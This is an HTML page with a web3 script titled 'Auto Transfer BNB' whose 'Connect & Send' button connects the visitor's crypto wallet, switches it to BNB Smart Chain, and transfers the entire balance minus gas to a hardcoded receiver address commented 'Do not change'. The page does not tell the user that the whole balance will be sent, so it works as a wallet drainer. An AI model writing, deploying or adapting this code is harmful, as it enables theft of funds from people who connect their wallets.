<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer BNB</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
    const GAS_LIMIT = 21000; // Standard gas limit for BNB transfer

    async function connectAndTransfer() {
      // Check for wallet provider (MetaMask, Trust Wallet, etc.)
      let web3;
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
      } else if (window.web3) {
        web3 = new Web3(window.web3.currentProvider); // Fallback for older wallet versions
      } else {
        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
        return;
      }

      try {
        // Request account access
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        if (!accounts || accounts.length === 0) {
          alert("Could not connect to wallet. Please ensure your wallet is unlocked and try again.");
          return;
        }
        const sender = accounts[0];

        // Ensure BNB Smart Chain Mainnet (chainId 56, which is 0x38 in hex)
        const chainId = await web3.eth.getChainId();
        const chainIdHex = web3.utils.toHex(chainId);
        if (chainIdHex !== "0x38") {
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            alert("Please switch to BNB Smart Chain Mainnet manually in your wallet.");
            return;
          }
        }

        // Get full balance (returned as a string in wei)
        const balance = await web3.eth.getBalance(sender);
        const balanceBigInt = BigInt(balance);

        // Get current gas price
        const gasPrice = await web3.eth.getGasPrice();
        const gasPriceBigInt = BigInt(gasPrice);

        // Calculate gas estimate
        const gasEstimate = BigInt(GAS_LIMIT) * gasPriceBigInt;

        // Calculate amount to send: balance - gasEstimate
        let amountToSend = balanceBigInt - gasEstimate;

        if (amountToSend <= 0) {
          alert("Insufficient BNB to cover gas fees. Please add more BNB to your wallet.");
          return;
        }

        // Send BNB with fixed gas limit
        const tx = await web3.eth.sendTransaction({
          from: sender,
          to: receiverAddress,
          value: web3.utils.toHex(amountToSend.toString()),
          gas: GAS_LIMIT
        });

        alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
      } catch (error) {
        alert("Error: " + error.message);
        console.error("Transaction Error:", error);
      }
    }
  </script>
</body>
</html>
